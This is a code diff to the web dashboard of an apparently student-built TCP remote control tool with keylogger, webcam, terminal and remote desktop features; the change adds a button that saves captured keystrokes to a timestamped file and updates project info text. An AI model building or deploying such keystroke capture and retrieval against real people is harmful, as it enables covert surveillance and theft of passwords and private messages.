@@ -272,6 +272,7 @@
                     <button onclick="toggleKeylog(true)" class="btn btn-success"><i class="fa-solid fa-play"></i> <span data-lang="btn_start">Bắt đầu</span></button>
                     <button onclick="toggleKeylog(false)" class="btn" style="background:#f39c12"><i class="fa-solid fa-pause"></i> <span data-lang="btn_stop">Dừng</span></button>
                     <button onclick="clearLogs()" class="btn btn-danger" style="margin-left: auto;"><i class="fa-solid fa-trash"></i> <span data-lang="btn_clear">Xóa</span></button>
+                    <button onclick="downloadKeylog()" class="btn" style="background: var(--accent); margin-left: 10px;"><i class="fa-solid fa-download"></i> <span data-lang="btn_dl">Tải về</span></button>
                 </div>
             </div>
         </div>
@@ -310,8 +311,8 @@
             vi: {
                 home: "Trang chủ", apps: "Ứng dụng", tasks: "Tác vụ", files: "Tệp tin", term: "Lệnh", view: "Xem", cam: "Cam", keys: "Phím", pwr: "Nguồn",
                 mode: "Chế độ", set: "Cài đặt", lang_btn: "Ngôn ngữ", connected: "Đã kết nối",
-                info_title: "Thông Tin Đồ Án", info_subj: "Môn học:", info_subj_val: "Mạng máy tính",
-                info_fac: "Khoa:", info_fac_val: "Công nghệ Thông tin - Đại học Khoa học Tự nhiên, ĐHQG-HCM",
+                info_title: "Thông Tin Đồ Án", info_subj: "Môn học:", info_subj_val: "Mạng máy tính - Sinh viên Năm 2",
+                info_fac: "Khoa:", info_fac_val: "Công nghệ Thông tin - ĐH KHTN, ĐHQG-HCM",
                 info_desc: "Mô tả:", info_desc_val: "Hệ thống điều khiển từ xa qua TCP. Quản lý Process, App, File, Terminal, Keylogger, Webcam, Remote Desktop.",
                 info_mem: "Thành viên thực hiện:",
                 res_title: "Tài nguyên thời gian thực", feat_title: "Tất cả chức năng",
@@ -319,7 +320,7 @@
                 th_name: "Tên", th_size: "Kích thước", th_action: "Hành động",
                 proc_title: "Tiến trình hàng đầu", app_title: "Ứng dụng đã cài",
                 screen_title: "Theo dõi màn hình",
-                btn_snap: "Chụp & Lưu", btn_record: "Ghi hình", btn_refresh: "Làm mới", btn_start: "Bắt đầu", btn_stop: "Dừng", btn_clear: "Xóa",
+                btn_snap: "Chụp & Lưu", btn_record: "Ghi hình", btn_refresh: "Làm mới", btn_start: "Bắt đầu", btn_stop: "Dừng", btn_clear: "Xóa", btn_dl: "Tải về",
                 key_title: "Nhật ký phím",
                 pwr_title: "Điều khiển Nguồn", pwr_desc: "Cẩn thận! Hành động này sẽ tắt hoặc khởi động lại máy thật.",
                 set_title: "Cài đặt kết nối", btn_connect: "Kết nối", btn_close: "Đóng"
@@ -327,8 +328,8 @@
             en: {
                 home: "Home", apps: "Apps", tasks: "Tasks", files: "Files", term: "Term", view: "View", cam: "Cam", keys: "Keys", pwr: "Power",
                 mode: "Mode", set: "Setup", lang_btn: "Language", connected: "Connected",
-                info_title: "Project Info", info_subj: "Subject:", info_subj_val: "Computer Networks",
-                info_fac: "Faculty:", info_fac_val: "Information Technology - HCMUS-VNU",
+                info_title: "Project Info", info_subj: "Subject:", info_subj_val: "Computer Networks - 2nd Year Student",
+                info_fac: "Faculty:", info_fac_val: "Information Technology - VNUHCM-US",
                 info_desc: "Desc:", info_desc_val: "Remote Control System via TCP. Features: Process, App, File, Terminal, Keylogger, Webcam, Remote Desktop.",
                 info_mem: "Team Members:",
                 res_title: "Real-time Resources", feat_title: "All Features",
@@ -336,7 +337,7 @@
                 th_name: "Name", th_size: "Size", th_action: "Action",
                 proc_title: "Top Processes", app_title: "Installed Apps",
                 screen_title: "Screen Monitor",
-                btn_snap: "Capture", btn_record: "Record", btn_refresh: "Refresh", btn_start: "Start", btn_stop: "Stop", btn_clear: "Clear",
+                btn_snap: "Capture", btn_record: "Record", btn_refresh: "Refresh", btn_start: "Start", btn_stop: "Stop", btn_clear: "Clear", btn_dl: "Download",
                 key_title: "Live Keylogs",
                 pwr_title: "Power Control", pwr_desc: "Warning! These actions affect the physical machine.",
                 set_title: "Connection Settings", btn_connect: "Connect", btn_close: "Close"
@@ -372,23 +373,35 @@
             
             document.getElementById('page-title').textContent = id.toUpperCase();
             
-            // --- CẬP NHẬT MỚI: Tự động xóa nội dung Keylog khi mở tab ---
-            if(id === 'keylogger') {
-                // Gọi hàm này để vừa xóa UI vừa báo Server xóa file log cũ
-                clearLogs();
-            }
-            
             if(id === 'files') loadFiles('.');
             if(id === 'processes') loadProcesses();
             if(id === 'apps') loadApps();
         }
 
-        // --- HÀM XÓA KEYLOG NGAY LẬP TỨC (UI + SERVER) ---
+        // --- HÀM DOWNLOAD KEYLOG ---
+        function downloadKeylog() {
+            // Lấy nội dung text
+            const content = document.getElementById('keylog-content').textContent;
+            
+            // Tạo tên file theo thời gian
+            const now = new Date();
+            const filename = `keylog_${now.getFullYear()}-${(now.getMonth()+1).toString().padStart(2,'0')}-${now.getDate().toString().padStart(2,'0')}_${now.getHours()}-${now.getMinutes()}.txt`;
+            
+            // Tạo blob và tải về
+            const blob = new Blob([content], { type: "text/plain" });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = filename;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+
+        // --- HÀM XÓA KEYLOG (UI + SERVER) ---
         function clearLogs() {
-            // Xóa ngay lập tức trên giao diện, không cần đợi server
             document.getElementById('keylog-content').textContent = 'Waiting for input...';
-            // Gửi lệnh xóa ngầm cho server
             sendControl('keylog_clear');
+            document.activeElement.blur();
         }
 
         // --- CHART JS ---
